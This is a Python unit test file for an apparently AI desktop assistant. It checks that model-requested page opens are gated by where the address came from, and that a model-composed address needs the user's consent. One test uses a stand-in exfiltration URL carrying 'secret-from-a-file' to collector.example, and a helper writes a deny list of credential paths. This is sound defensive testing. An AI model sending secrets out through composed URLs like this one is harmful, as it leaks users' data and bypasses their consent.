"""S10 stage A in a conversation: the model asks for a page, the program's broker opens it, the text is data.

Provenance (maintainer's decision): an address typed by the user, found by the search or linked from an opened page
opens without asking; an address the model composed is shown in full and needs a yes.
"""
import json
import unittest
from unittest.mock import patch

from ai_desktop import terminal_consent, web_broker
from test_ask_discovery import Base

FINAL = "Odpowiedz na podstawie strony."
ANSWER = json.dumps({"action": "answer", "text": FINAL})


def opening(url):
    return json.dumps({"action": "web-open", "url": url})


def page(url, links=(), text="Release 2.4.1 notes"):
    return {"url": url, "final_url": url, "title": "Releases", "text": text, "links": list(links), "truncated": False,
            "content_type": "text/html"}


class WebOpenFlowTests(Base):
    def write_policy(self, extra="", deny=(), web=True):
        denied = ["~/.config/ai-desktop/", "~/.config/vault/", "~/.config/gizmo/token.txt", *deny]
        self.config.write_text('version = 2\n[network]\nclaude = true\ncodex = true\nweb = %s\n[files]\n'
                               'read = ["~/.config/**"]\ndeny = %s\n%s' % ("true" if web else "false", json.dumps(denied),
                                                                            extra), encoding="utf-8")
        self.config.chmod(0o600)

    def run_open(self, replies, *, question="Przeczytaj https://example.org/releases i powiedz, co nowego", pages=None,
                 answers=()):
        pages = dict(pages or {})
        opened, asked = [], []

        def open_page(url, **_):
            opened.append(url)
            result = pages.get(url)
            if isinstance(result, Exception):
                raise result
            return result or page(url)

        def confirm(action, **_):
            asked.append(action)
            return answers[len(asked) - 1] if len(asked) <= len(answers) else False

        with patch.object(web_broker, "open_page", side_effect=open_page), \
                patch.object(terminal_consent, "confirm", side_effect=confirm):
            result = self.run_flow(replies, question=question)
        return result, opened, asked

    def test_an_address_from_the_question_opens_without_asking_and_its_text_reaches_the_next_round(self):
        result, opened, asked = self.run_open([opening("https://example.org/releases"), ANSWER],
                                              pages={"https://example.org/releases": page(
                                                  "https://example.org/releases", ["https://example.org/dl/2.4.1.zip"])})
        self.assertEqual((result, opened, asked), (FINAL, ["https://example.org/releases"], []))
        step = self.wire[-1]["discovery"]["steps"][-1]
        self.assertEqual((step["op"], step["status"], step["text"]), ("page", "ok", "Release 2.4.1 notes"))
        self.assertEqual(step["links"], ["https://example.org/dl/2.4.1.zip"])
        self.assertIn("Page https://example.org/releases", self.output.getvalue())

    def test_a_link_of_an_opened_page_opens_without_asking_too(self):
        _, opened, asked = self.run_open(
            [opening("https://example.org/releases"), opening("https://example.org/notes/2.4.1"), ANSWER],
            pages={"https://example.org/releases": page("https://example.org/releases", ["https://example.org/notes/2.4.1"])})
        self.assertEqual(opened, ["https://example.org/releases", "https://example.org/notes/2.4.1"])
        self.assertEqual(asked, [])

    def test_a_composed_address_is_shown_and_opens_only_after_yes(self):
        composed = "https://collector.example/?d=secret-from-a-file"
        result, opened, asked = self.run_open([opening(composed), ANSWER], question="Co nowego w dodatku X?")
        self.assertEqual((result, opened, asked), (FINAL, [], ["web-open"]))         # declined: never fetched
        self.assertIn(composed, self.output.getvalue())
        step = self.wire[-1]["discovery"]["steps"][-1]
        self.assertEqual((step["status"], step["url"], step["text"]), ("declined", composed, ""))
        _, opened, asked = self.run_open([opening(composed), ANSWER], question="Co nowego w dodatku X?", answers=(True,))
        self.assertEqual((opened, asked), ([composed], ["web-open"]))

    def test_refusals_are_recorded_without_fetching_and_the_question_goes_on(self):
        result, opened, asked = self.run_open([opening("http://example.org/"), ANSWER], question="Co nowego?")
        self.assertEqual((result, opened, asked), (FINAL, [], []))
        self.assertEqual(self.wire[-1]["discovery"]["steps"][-1], {"op": "page", "url": "", "status": "refused",
                                                                   "title": "", "text": "", "links": [],
                                                                   "truncated": False})
        result, opened, _ = self.run_open([opening("https://example.org/releases"), ANSWER],
                                          pages={"https://example.org/releases": web_broker.WebError("address")})
        self.assertEqual(result, FINAL)
        step = self.wire[-1]["discovery"]["steps"][-1]
        self.assertEqual((step["status"], step["url"]), ("refused", "https://example.org/releases"))
        self.assertIn("refused (address)", self.output.getvalue())

    def test_without_web_access_the_plan_is_refused(self):
        self.write_policy(web=False)
        from ai_desktop import assistant_contract
        with self.assertRaises(assistant_contract.PlanError):
            self.run_open([opening("https://example.org/releases")])


if __name__ == "__main__":
    unittest.main()
